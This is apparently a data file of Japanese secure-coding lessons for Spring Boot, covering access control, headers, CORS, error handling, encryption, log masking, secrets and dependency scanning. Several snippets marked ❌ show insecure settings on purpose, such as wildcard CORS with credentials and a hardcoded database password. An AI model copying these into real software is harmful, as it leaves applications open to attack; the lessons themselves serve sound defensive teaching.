          "ロールベースアクセス制御（RBAC）は、ユーザーにロール（役割）を割り当て、ロールに基づいてアクセス権限を管理する方式です。Spring Securityでは、URLパターンやメソッドに対してロールベースの制御を設定できます。より細かい制御が必要な場合は、パーミッション（権限）ベースの制御も組み合わせます。",
        code: `// ✅ ロールの定義
public enum Role {
    USER,       // 一般ユーザー
    MANAGER,    // マネージャー
    ADMIN       // 管理者
}

// ✅ URLベースのアクセス制御
@Configuration
@EnableWebSecurity
public class WebSecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http)
            throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                // 公開エンドポイント
                .requestMatchers("/", "/login", "/register")
                    .permitAll()
                .requestMatchers("/api/public/**").permitAll()
                // 管理者のみ
                .requestMatchers("/admin/**").hasRole("ADMIN")
                // マネージャー以上
                .requestMatchers("/management/**")
                    .hasAnyRole("ADMIN", "MANAGER")
                // APIはロール＋パーミッション
                .requestMatchers(HttpMethod.DELETE, "/api/**")
                    .hasAuthority("PERMISSION_DELETE")
                // その他は認証必須
                .anyRequest().authenticated()
            );
        return http.build();
    }
}

// ✅ ロール階層の定義
@Bean
public RoleHierarchy roleHierarchy() {
    return RoleHierarchyImpl.withDefaultRolePrefix()
        .role("ADMIN").implies("MANAGER")
        .role("MANAGER").implies("USER")
        .build();
    // ADMIN は MANAGER と USER の権限も持つ
}

// ✅ パーミッションベースの制御
@Entity
public class UserEntity {
    @ManyToMany(fetch = FetchType.EAGER)
    private Set<RoleEntity> roles;
}

@Entity
public class RoleEntity {
    private String name; // ROLE_ADMIN
    @ManyToMany(fetch = FetchType.EAGER)
    private Set<Permission> permissions;
}

@Entity
public class Permission {
    private String name; // PERMISSION_DELETE, PERMISSION_EXPORT
}`,
      },
      {
        title: "API認可設計",
        content:
          "REST APIの認可設計では、OAuth 2.0 / OpenID Connectが標準的なプロトコルです。JWTトークンにスコープや権限を含め、APIゲートウェイやフィルターで検証します。マイクロサービス環境では、サービス間認証も重要です。過剰な権限を与えない最小権限の原則を常に意識しましょう。",
        code: `// ✅ OAuth 2.0 Resource Server 設定
@Configuration
@EnableWebSecurity
public class OAuth2ResourceServerConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http)
            throws Exception {
        http
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt
                    .jwtAuthenticationConverter(
                        jwtAuthenticationConverter())
                )
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**")
                    .hasAuthority("SCOPE_admin")
                .requestMatchers("/api/users/**")
                    .hasAuthority("SCOPE_user:read")
                .anyRequest().authenticated()
            );
        return http.build();
    }

    // JWT内のclaimsからロール・権限を抽出
    @Bean
    public JwtAuthenticationConverter jwtAuthenticationConverter() {
        JwtGrantedAuthoritiesConverter converter =
            new JwtGrantedAuthoritiesConverter();
        converter.setAuthoritiesClaimName("roles");
        converter.setAuthorityPrefix("ROLE_");

        JwtAuthenticationConverter jwtConverter =
            new JwtAuthenticationConverter();
        jwtConverter.setJwtGrantedAuthoritiesConverter(converter);
        return jwtConverter;
    }
}

// ✅ スコープベースのAPI制御
@RestController
@RequestMapping("/api/users")
public class UserApiController {

    @PreAuthorize("hasAuthority('SCOPE_user:read')")
    @GetMapping
    public List<UserDto> listUsers() {
        return userService.findAll();
    }

    @PreAuthorize("hasAuthority('SCOPE_user:write')")
    @PostMapping
    public UserDto createUser(@RequestBody CreateUserRequest req) {
        return userService.create(req);
    }

    @PreAuthorize("hasAuthority('SCOPE_user:delete')")
    @DeleteMapping("/{id}")
    public void deleteUser(@PathVariable Long id) {
        userService.delete(id);
    }
}`,
      },
    ],
  },
  {
    id: "security-misconfiguration",
    title: "セキュリティ設定",
    description:
      "デフォルト設定の危険性、HTTPヘッダー、CORS、エラーメッセージの情報漏洩防止を学ぶ",
    category: "auth",
    sections: [
      {
        title: "デフォルト設定の危険性",
        content:
          "フレームワークやミドルウェアのデフォルト設定は、開発の利便性を優先しており、本番環境では危険な場合があります。デバッグモードの無効化、デフォルトのクレデンシャル変更、不要な機能・エンドポイントの無効化、Actuatorエンドポイントの保護など、本番デプロイ前に必ず確認すべき項目があります。",
        code: `// ❌ 危険なデフォルト設定の例
// application.yml（開発環境のまま本番へ…）
// spring:
//   h2:
//     console:
//       enabled: true  # H2コンソールが外部公開
//   jpa:
//     show-sql: true   # SQLがログに出力
//   devtools:
//     restart:
//       enabled: true  # DevToolsが有効

// ✅ 本番環境の安全な設定
// application-prod.yml
// spring:
//   h2:
//     console:
//       enabled: false
//   jpa:
//     show-sql: false
//     open-in-view: false
//   devtools:
//     restart:
//       enabled: false

// ✅ Actuatorエンドポイントの保護
// management:
//   endpoints:
//     web:
//       exposure:
//         include: health,info,metrics
//   endpoint:
//     health:
//       show-details: when-authorized

@Configuration
@EnableWebSecurity
public class ActuatorSecurityConfig {

    @Bean
    @Order(1)
    public SecurityFilterChain actuatorFilterChain(HttpSecurity http)
            throws Exception {
        http
            .securityMatcher("/actuator/**")
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/actuator/health").permitAll()
                .requestMatchers("/actuator/**").hasRole("ADMIN")
            )
            .httpBasic(Customizer.withDefaults());
        return http.build();
    }
}

// ✅ セキュリティチェックリスト
// □ デバッグモード無効化
// □ デフォルトパスワード変更
// □ 不要なエンドポイント無効化
// □ Stack Traceの非表示
// □ ディレクトリリスティング無効化
// □ 不要なHTTPメソッド（TRACE, OPTIONS）無効化`,
      },
      {
        title: "HTTPセキュリティヘッダー",
        content:
          "HTTPセキュリティヘッダーは、ブラウザに対してセキュリティポリシーを指示するもので、多くの攻撃を防ぐ重要な防御層です。Spring Securityはいくつかのヘッダーをデフォルトで設定しますが、追加の設定も必要です。Strict-Transport-Security、X-Content-Type-Options、X-Frame-Options、Referrer-Policyなどを適切に設定しましょう。",
        code: `// ✅ Spring Security でHTTPセキュリティヘッダーを設定
@Configuration
@EnableWebSecurity
public class SecurityHeadersConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http)
            throws Exception {
        http
            .headers(headers -> headers
                // HTTPS強制（HSTS）
                .httpStrictTransportSecurity(hsts -> hsts
                    .maxAgeInSeconds(31536000) // 1年
                    .includeSubDomains(true)
                    .preload(true)
                )
                // クリックジャッキング防止
                .frameOptions(frame -> frame.deny())
                // MIMEタイプスニッフィング防止
                .contentTypeOptions(
                    Customizer.withDefaults()) // nosniff
                // XSSフィルター（レガシーブラウザ用）
                .xssProtection(xss ->
                    xss.headerValue(
                        XXssProtectionHeaderWriter.HeaderValue
                            .ENABLED_MODE_BLOCK))
                // CSP
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives(
                        "default-src 'self'; "
                        + "script-src 'self'"))
                // Referrerポリシー
                .referrerPolicy(referrer -> referrer
                    .policy(ReferrerPolicyHeaderWriter
                        .ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
                // Permissions-Policy
                .permissionsPolicy(permissions -> permissions
                    .policy("camera=(), microphone=(), "
                          + "geolocation=(self)"))
            );
        return http.build();
    }
}

// 設定後のレスポンスヘッダー例:
// Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
// X-Content-Type-Options: nosniff
// X-Frame-Options: DENY
// X-XSS-Protection: 1; mode=block
// Content-Security-Policy: default-src 'self'; script-src 'self'
// Referrer-Policy: strict-origin-when-cross-origin
// Permissions-Policy: camera=(), microphone=(), geolocation=(self)`,
      },
      {
        title: "CORSの正しい設定",
        content:
          "CORS（Cross-Origin Resource Sharing）は、異なるオリジンからのリクエストを制御する仕組みです。Access-Control-Allow-Originにワイルドカード（*）を設定するのは、認証を必要としない公開APIを除いて危険です。許可するオリジンを明示的に指定し、認証付きリクエスト（withCredentials）の場合は特に注意が必要です。",
        code: `// ❌ 危険なCORS設定
@Configuration
public class BadCorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/**")
            .allowedOrigins("*")           // 全オリジン許可は危険
            .allowedMethods("*")           // 全メソッド許可
            .allowCredentials(true);       // ワイルドカード+認証は不可
    }
}

// ✅ 安全なCORS設定
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins(
                "https://myapp.example.com",
                "https://admin.example.com"
            )
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders(
                "Authorization", "Content-Type", "X-XSRF-TOKEN"
            )
            .exposedHeaders("X-Total-Count")
            .allowCredentials(true)
            .maxAge(3600); // プリフライトのキャッシュ1時間
    }
}

// ✅ Spring Security でのCORS設定
@Bean
public SecurityFilterChain filterChain(HttpSecurity http)
        throws Exception {
    http
        .cors(cors -> cors
            .configurationSource(corsConfigurationSource())
        );
    return http.build();
}

@Bean
public CorsConfigurationSource corsConfigurationSource() {
    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(List.of(
        "https://myapp.example.com"));
    config.setAllowedMethods(List.of(
        "GET", "POST", "PUT", "DELETE"));
    config.setAllowedHeaders(List.of(
        "Authorization", "Content-Type"));
    config.setAllowCredentials(true);

    UrlBasedCorsConfigurationSource source =
        new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/api/**", config);
    return source;
}`,
      },
      {
        title: "エラーメッセージの情報漏洩防止",
        content:
          "詳細なエラーメッセージやスタックトレースは、攻撃者にシステムの内部構造やフレームワークのバージョンなどの情報を与えてしまいます。本番環境では、ユーザーには一般的なエラーメッセージを表示し、詳細情報はサーバーログにのみ記録するようにしましょう。Spring Bootのエラーハンドリングをカスタマイズして情報漏洩を防止します。",
        code: `// ✅ グローバル例外ハンドラー - 情報漏洩防止
@RestControllerAdvice
public class GlobalExceptionHandler {

    private static final Logger log =
        LoggerFactory.getLogger(GlobalExceptionHandler.class);

    // 予期しないエラー - 詳細を隠す
    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleException(
            Exception ex) {
        // ログには詳細を記録
        log.error("内部エラーが発生しました", ex);

        // クライアントには一般的なメッセージのみ
        return ResponseEntity
            .status(HttpStatus.INTERNAL_SERVER_ERROR)
            .body(new ErrorResponse(
                "INTERNAL_ERROR",
                "予期しないエラーが発生しました"
                // ❌ ex.getMessage() を返さない！
                // ❌ スタックトレースを返さない！
            ));
    }

    // 認証エラー - ヒントを与えない
    @ExceptionHandler(BadCredentialsException.class)
    public ResponseEntity<ErrorResponse> handleAuthError(
            BadCredentialsException ex) {
        // ❌ "パスワードが間違っています" → ユーザー名の存在が漏洩
        // ✅ "ユーザー名またはパスワードが正しくありません"
        return ResponseEntity
            .status(HttpStatus.UNAUTHORIZED)
            .body(new ErrorResponse(
                "AUTH_FAILED",
                "ユーザー名またはパスワードが正しくありません"
            ));
    }

    // リソース未検出 - 存在の有無を隠す
    @ExceptionHandler(ResourceNotFoundException.class)
    public ResponseEntity<ErrorResponse> handleNotFound(
            ResourceNotFoundException ex) {
        return ResponseEntity
            .status(HttpStatus.NOT_FOUND)
            .body(new ErrorResponse(
                "NOT_FOUND",
                "リソースが見つかりません"
            ));
    }
}

// ✅ application-prod.yml
// server:
//   error:
//     include-message: never
//     include-stacktrace: never
//     include-binding-errors: never
//     include-exception: false`,
      },
    ],
  },
  // ===== データ保護 =====
  {
    id: "sensitive-data",
    title: "機密データの保護",
    description:
      "HTTPS/TLS、データ暗号化、ログのマスキング、環境変数による秘密管理を学ぶ",
    category: "data",
    sections: [
      {
        title: "HTTPS/TLS設定",
        content:
          "HTTPS（TLS）は、通信経路上のデータを暗号化し、盗聴や改ざんを防止します。本番環境では必ずTLS 1.2以上を使用し、HTTP通信をHTTPSにリダイレクトする設定を行います。Spring Bootでは組み込みサーバーのSSL設定や、リバースプロキシ経由でのTLS終端が可能です。証明書の管理と更新も忘れずに行いましょう。",
        code: `// ✅ Spring Boot SSL設定 - application.yml
// server:
//   port: 8443
//   ssl:
//     enabled: true
//     key-store: classpath:keystore.p12
//     key-store-password: \${KEYSTORE_PASSWORD}
//     key-store-type: PKCS12
//     key-alias: myapp
//     protocol: TLS
//     enabled-protocols: TLSv1.3,TLSv1.2

// ✅ HTTPからHTTPSへのリダイレクト
@Configuration
public class HttpsRedirectConfig {

    @Bean
    public ServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory tomcat =
            new TomcatServletWebServerFactory() {
                @Override
                protected void postProcessContext(Context context) {
                    SecurityConstraint constraint =
                        new SecurityConstraint();
                    constraint.setUserConstraint("CONFIDENTIAL");
                    SecurityCollection collection =
                        new SecurityCollection();
                    collection.addPattern("/*");
                    constraint.addCollection(collection);
                    context.addConstraint(constraint);
                }
            };
        tomcat.addAdditionalTomcatConnectors(httpConnector());
        return tomcat;
    }

    private Connector httpConnector() {
        Connector connector = new Connector(
            TomcatServletWebServerFactory.DEFAULT_PROTOCOL);
        connector.setScheme("http");
        connector.setPort(8080);
        connector.setSecure(false);
        connector.setRedirectPort(8443);
        return connector;
    }
}

// ✅ Spring Security でHTTPS強制
@Bean
public SecurityFilterChain filterChain(HttpSecurity http)
        throws Exception {
    http.requiresChannel(channel ->
        channel.anyRequest().requiresSecure()
    );
    return http.build();
}`,
      },
      {
        title: "データ暗号化 (AES/RSA)",
        content:
          "保存データ（Data at Rest）の暗号化は、データベースやファイルに保存される機密情報を保護するために重要です。対称暗号（AES）は大量データの暗号化に適し、非対称暗号（RSA）は鍵交換やデジタル署名に使用します。JavaのCipher APIを使って実装でき、暗号鍵の安全な管理が最も重要なポイントです。",
        code: `// ✅ AES-256-GCM による暗号化・復号
@Service
public class AesEncryptionService {

    private static final String ALGORITHM = "AES/GCM/NoPadding";
    private static final int GCM_TAG_LENGTH = 128;
    private static final int IV_LENGTH = 12;

    private final SecretKey secretKey;

    public AesEncryptionService(
            @Value("\${encryption.key}") String base64Key) {
        byte[] keyBytes = Base64.getDecoder().decode(base64Key);
        this.secretKey = new SecretKeySpec(keyBytes, "AES");
    }

    // 暗号化
    public String encrypt(String plainText) throws Exception {
        byte[] iv = new byte[IV_LENGTH];
        SecureRandom.getInstanceStrong().nextBytes(iv);

        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.ENCRYPT_MODE, secretKey,
            new GCMParameterSpec(GCM_TAG_LENGTH, iv));

        byte[] encrypted = cipher.doFinal(
            plainText.getBytes(StandardCharsets.UTF_8));

        // IV + 暗号文を結合してBase64エンコード
        byte[] combined = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(encrypted, 0, combined,
            iv.length, encrypted.length);
        return Base64.getEncoder().encodeToString(combined);
    }

    // 復号
    public String decrypt(String cipherText) throws Exception {
        byte[] combined = Base64.getDecoder().decode(cipherText);
        byte[] iv = Arrays.copyOfRange(combined, 0, IV_LENGTH);
        byte[] encrypted = Arrays.copyOfRange(
            combined, IV_LENGTH, combined.length);

        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.DECRYPT_MODE, secretKey,
            new GCMParameterSpec(GCM_TAG_LENGTH, iv));
        byte[] decrypted = cipher.doFinal(encrypted);
        return new String(decrypted, StandardCharsets.UTF_8);
    }
}

// ✅ JPA属性コンバーターで自動暗号化
@Converter
public class EncryptedStringConverter
        implements AttributeConverter<String, String> {
    @Autowired
    private AesEncryptionService encryptionService;

    @Override
    public String convertToDatabaseColumn(String attribute) {
        return encryptionService.encrypt(attribute);
    }
    @Override
    public String convertToEntityAttribute(String dbData) {
        return encryptionService.decrypt(dbData);
    }
}

@Entity
public class Customer {
    @Convert(converter = EncryptedStringConverter.class)
    private String creditCardNumber; // DBには暗号文で保存
}`,
      },
      {
        title: "ログの機密情報マスキング",
        content:
          "ログにパスワード、クレジットカード番号、トークンなどの機密情報が出力されると、ログファイルの漏洩時に深刻な被害を招きます。Logbackのカスタムレイアウトやフィルターを使って機密情報をマスキングし、toStringメソッドでも機密フィールドを除外するようにしましょう。リクエスト/レスポンスのログにも注意が必要です。",
        code: `// ✅ Logback マスキングレイアウト
public class MaskingPatternLayout extends PatternLayout {

    private static final List<Pattern> MASK_PATTERNS = List.of(
        // パスワード
        Pattern.compile(
            "(password\\\\s*[=:]\\\\s*)([^\\\\s,;]+)",
            Pattern.CASE_INSENSITIVE),
        // クレジットカード番号
        Pattern.compile("\\\\b(\\\\d{4})\\\\d{8,12}(\\\\d{4})\\\\b"),
        // メールアドレス
        Pattern.compile(
            "([a-zA-Z0-9._%+-]+)(@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,})")
    );

    @Override
    public String doLayout(ILoggingEvent event) {
        String message = super.doLayout(event);
        return maskSensitiveData(message);
    }

    private String maskSensitiveData(String message) {
        String masked = message;
        // パスワードをマスク
        masked = MASK_PATTERNS.get(0).matcher(masked)
            .replaceAll("$1****");
        // カード番号を部分マスク
        masked = MASK_PATTERNS.get(1).matcher(masked)
            .replaceAll("$1********$2");
        // メールアドレスを部分マスク
        masked = MASK_PATTERNS.get(2).matcher(masked)
            .replaceAll("***$2");
        return masked;
    }
}

// ✅ DTOのtoStringでマスキング
public class UserDto {
    private String username;
    private String email;
    private String password;

    @Override
    public String toString() {
        return "UserDto{"
            + "username='" + username + "'"
            + ", email='" + maskEmail(email) + "'"
            + ", password='****'"
            + "}";
    }

    private String maskEmail(String email) {
        if (email == null) return null;
        int atIndex = email.indexOf('@');
        if (atIndex <= 1) return "***" + email.substring(atIndex);
        return email.charAt(0) + "***" + email.substring(atIndex);
    }
}

// ✅ logback-spring.xml 設定
// <configuration>
//   <appender name="CONSOLE"
//       class="ch.qos.logback.core.ConsoleAppender">
//     <layout class="com.example.MaskingPatternLayout">
//       <pattern>%d{yyyy-MM-dd HH:mm:ss} %-5level - %msg%n</pattern>
//     </layout>
//   </appender>
// </configuration>`,
      },
      {
        title: "環境変数での秘密管理",
        content:
          "データベースパスワード、APIキー、暗号鍵などの秘密情報をソースコードやプロパティファイルにハードコードしてはいけません。環境変数、Spring Cloud Config、HashiCorp Vault、AWS Secrets Managerなどを使用して、秘密情報を安全に管理しましょう。.gitignoreで設定ファイルがリポジトリにコミットされないようにすることも重要です。",
        code: `// ❌ 危険 - ハードコードされた秘密情報
// application.yml
// spring:
//   datasource:
//     url: jdbc:mysql://localhost:3306/mydb
//     username: root
//     password: mySecretPassword123  # ソースコードに秘密情報！

// ✅ 環境変数を使用
// application.yml
// spring:
//   datasource:
//     url: \${DB_URL}
//     username: \${DB_USERNAME}
//     password: \${DB_PASSWORD}
//   mail:
//     password: \${MAIL_PASSWORD}

// ✅ Spring Cloud Config + 暗号化
// application.yml
// spring:
//   datasource:
//     password: '{cipher}AQBk3L2x...'

// ✅ HashiCorp Vault 連携
// build.gradle: implementation 'org.springframework.cloud:spring-cloud-starter-vault-config'
// bootstrap.yml
// spring:
//   cloud:
//     vault:
//       uri: https://vault.example.com:8200
//       token: \${VAULT_TOKEN}
//       kv:
//         backend: secret
//         default-context: myapp

@Configuration
public class VaultConfig {
    @Value("\${database.password}")  // Vaultから取得
    private String dbPassword;
}

// ✅ AWS Secrets Manager
@Configuration
public class AwsSecretsConfig {
    public DatabaseCredentials getDbCredentials() {
        AWSSecretsManager client = AWSSecretsManagerClientBuilder
            .standard()
            .withRegion("ap-northeast-1")
            .build();
        GetSecretValueRequest request = new GetSecretValueRequest()
            .withSecretId("prod/myapp/database");
        GetSecretValueResult result =
            client.getSecretValue(request);
        return new ObjectMapper()
            .readValue(result.getSecretString(),
                       DatabaseCredentials.class);
    }
}

// ✅ .gitignore で秘密情報ファイルを除外
// .env
// *.key
// *.pem
// application-local.yml
// secrets/`,
      },
    ],
  },
  {
    id: "dependency-check",
    title: "依存関係の脆弱性管理",
    description:
      "OWASP Dependency Check、Snyk/Dependabot、CVE対応、SBOMを活用した脆弱性管理を学ぶ",
    category: "data",
    sections: [
      {
        title: "OWASP Dependency Check",
        content:
          "OWASP Dependency Checkは、プロジェクトの依存ライブラリに含まれる既知の脆弱性（CVE）を検出するオープンソースツールです。GradleやMavenのプラグインとして簡単に導入でき、NVD（National Vulnerability Database）のデータを使って脆弱性をスキャンします。CI/CDパイプラインに組み込むことで、脆弱な依存関係の自動検出が可能です。",
        code: `// ✅ Gradle - OWASP Dependency Checkプラグイン
// build.gradle
plugins {
    id 'org.owasp.dependencycheck' version '9.0.9'
}

dependencyCheck {
    // CVSSスコア7以上で失敗（HIGH以上）
    failBuildOnCVSS = 7.0f

    // レポート形式
    formats = ['HTML', 'JSON']

    // 除外設定（誤検知対応）
    suppressionFile = 'dependency-check-suppression.xml'

    // NVD APIキー（推奨 - レート制限回避）
    nvd {
        apiKey = System.getenv('NVD_API_KEY')
    }
}

// 実行: ./gradlew dependencyCheckAnalyze

// ✅ Maven - pom.xml
// <plugin>
//   <groupId>org.owasp</groupId>
//   <artifactId>dependency-check-maven</artifactId>
//   <version>9.0.9</version>
//   <configuration>
//     <failBuildOnCVSS>7</failBuildOnCVSS>
//     <formats>
//       <format>HTML</format>
//       <format>JSON</format>
//     </formats>
//   </configuration>
// </plugin>
// 実行: mvn dependency-check:check

// ✅ 抑制ファイル - 誤検知の除外
// dependency-check-suppression.xml
// <?xml version="1.0" encoding="UTF-8"?>
// <suppressions xmlns="https://jeremylong.github.io/...">
//   <suppress>
//     <notes>誤検知: この脆弱性は当プロジェクトに影響なし</notes>
//     <cve>CVE-2023-XXXXX</cve>
//   </suppress>
// </suppressions>`,
      },
      {
        title: "Snyk / Dependabot",
        content:
          "SnykとGitHub Dependabotは、依存関係の脆弱性を自動的に検出し、修正プルリクエストを作成してくれるサービスです。Dependabotはバージョンアップの自動PR作成も行えます。Snykはより詳細な脆弱性情報とコードレベルのセキュリティスキャン機能を提供します。どちらもCI/CDに統合可能です。",
        code: `// ✅ GitHub Dependabot設定
// .github/dependabot.yml
// version: 2
// updates:
//   # Gradleの依存関係
//   - package-ecosystem: "gradle"
//     directory: "/"
//     schedule:
//       interval: "weekly"
//       day: "monday"
//     open-pull-requests-limit: 10
//     reviewers:
//       - "security-team"
//     labels:
//       - "dependencies"
//       - "security"
//
//   # GitHub Actionsのバージョン
//   - package-ecosystem: "github-actions"
//     directory: "/"
//     schedule:
//       interval: "weekly"

// ✅ Snyk CLI の使用
// $ snyk test               # 脆弱性スキャン
// $ snyk monitor            # 継続的な監視
// $ snyk fix                # 自動修正

// ✅ GitHub Actions でSnykスキャン
// .github/workflows/security.yml
// name: Security Scan
// on:
//   push:
//     branches: [main]
//   pull_request:
//     branches: [main]
//   schedule:
//     - cron: '0 9 * * 1'   # 毎週月曜9時
//
// jobs:
//   snyk:
//     runs-on: ubuntu-latest
//     steps:
//       - uses: actions/checkout@v4
//       - uses: snyk/actions/gradle@master
//         env:
//           SNYK_TOKEN: \${{ secrets.SNYK_TOKEN }}
//         with:
//           args: --severity-threshold=high

// ✅ Gradle でSnykプラグイン
// build.gradle
// plugins {
//     id 'io.snyk.gradle.plugin.snykplugin' version '0.6.1'
// }
// snyk {
//     severity = 'high'
//     autoDownload = true
// }`,
      },
      {
        title: "CVEの確認と対応",
        content:
          "CVE（Common Vulnerabilities and Exposures）は、公開された脆弱性に付与される一意の識別番号です。新しいCVEが公表されたら、自プロジェクトへの影響を評価し、パッチ適用やバージョンアップで対応します。CVSSスコアで重大度を判断し、Critical/Highの脆弱性は優先的に対応しましょう。脆弱性対応のプロセスを組織内で標準化することが重要です。",
        code: `// ✅ CVE対応プロセスの例

// 1. 脆弱性の検出と評価
// CVSSスコアによる重大度分類
// Critical (9.0-10.0): 即時対応 - 24時間以内
// High     (7.0-8.9):  緊急対応 - 1週間以内
// Medium   (4.0-6.9):  計画対応 - 1ヶ月以内
// Low      (0.1-3.9):  次回リリースで対応

// ✅ Spring Bootの脆弱性対応例
// CVE-2023-XXXXX: Spring Framework RCE脆弱性
// 影響範囲: Spring Framework 6.0.0 - 6.0.14

// 対応前 - build.gradle
// ext {
//     set('springVersion', '6.0.14')  // 脆弱なバージョン
// }

// 対応後 - build.gradle
// ext {
//     set('springVersion', '6.0.15')  // 修正バージョン
// }

// ✅ 脆弱性チェックスクリプト
// check-vulnerabilities.sh
// #!/bin/bash
// echo "=== 依存関係の脆弱性チェック ==="
//
// # OWASP Dependency Check
// ./gradlew dependencyCheckAnalyze
//
// # 結果をSlackに通知
// CRITICAL=$(cat build/reports/dependency-check-report.json | \\
//   jq '[.dependencies[].vulnerabilities[]? |
//   select(.cvssv3?.baseScore >= 9.0)] | length')
//
// if [ "$CRITICAL" -gt 0 ]; then
//   curl -X POST "$SLACK_WEBHOOK" \\
//     -d "{\\"text\\": \\"🚨 $CRITICAL 件のCritical脆弱性が検出されました\\"}"
// fi

// ✅ Gradle - 特定ライブラリの強制バージョン指定
// build.gradle
configurations.all {
    resolutionStrategy {
        // 脆弱なバージョンを強制的に安全なバージョンに置換
        force 'org.yaml:snakeyaml:2.2'
        force 'com.fasterxml.jackson.core:jackson-databind:2.16.1'

        // 推移的依存関係もチェック
        eachDependency { details ->
            if (details.requested.group == 'log4j'
                    && details.requested.name == 'log4j') {
                // Log4j 1.xの使用を禁止
                throw new GradleException(
                    "Log4j 1.x は脆弱です。Log4j 2.x を使用してください")
            }
        }
    }
}`,
      },
      {
        title: "SBOMの活用",
        content:
          "SBOM（Software Bill of Materials）は、ソフトウェアに含まれるすべてのコンポーネントとそのバージョンを一覧にしたものです。CycloneDXやSPDX形式で生成でき、脆弱性管理やライセンスコンプライアンスに活用できます。Spring Boot 3.xではActuatorでSBOM情報を公開する機能も追加されています。ソフトウェアサプライチェーンセキュリティの要です。",
        code: `// ✅ CycloneDX Gradle プラグインでSBOM生成
// build.gradle
plugins {
    id 'org.cyclonedx.bom' version '1.8.2'
}

cyclonedxBom {
    includeConfigs = ['runtimeClasspath']
    outputFormat = 'json'
    outputName = 'sbom'
    // コンポーネントの詳細情報を含める
    schemaVersion = '1.5'
}

// 実行: ./gradlew cyclonedxBom
// 出力: build/reports/sbom.json

// ✅ Maven - CycloneDX プラグイン
// <plugin>
//   <groupId>org.cyclonedx</groupId>
//   <artifactId>cyclonedx-maven-plugin</artifactId>
//   <version>2.7.11</version>
//   <executions>
//     <execution>
//       <phase>verify</phase>
//       <goals><goal>makeBom</goal></goals>
//     </execution>
//   </executions>
// </plugin>
// 実行: mvn verify

// ✅ Spring Boot Actuator でSBOM公開
// build.gradle
// implementation 'org.springframework.boot:spring-boot-starter-actuator'

// application.yml
// management:
//   endpoints:
//     web:
//       exposure:
//         include: sbom
//   endpoint:
//     sbom:
//       enabled: true

// GET /actuator/sbom → SBOM情報を取得

// ✅ GitHub Actions でSBOM生成と脆弱性スキャン
// .github/workflows/sbom.yml
// name: SBOM Generation
// on:
//   push:
//     branches: [main]
//
// jobs:
//   sbom:
//     runs-on: ubuntu-latest
//     steps:
//       - uses: actions/checkout@v4
//       - uses: actions/setup-java@v4
//         with:
//           java-version: '21'
//           distribution: 'temurin'
//
//       - name: Generate SBOM
//         run: ./gradlew cyclonedxBom
//
//       - name: Upload SBOM
//         uses: actions/upload-artifact@v4
//         with:
//           name: sbom
//           path: build/reports/sbom.json
//
//       - name: Scan SBOM for vulnerabilities
//         uses: anchore/sbom-action@v0
//         with:
//           sbom-artifact-match: ".*sbom.*"`,
      },
    ],
  },
];
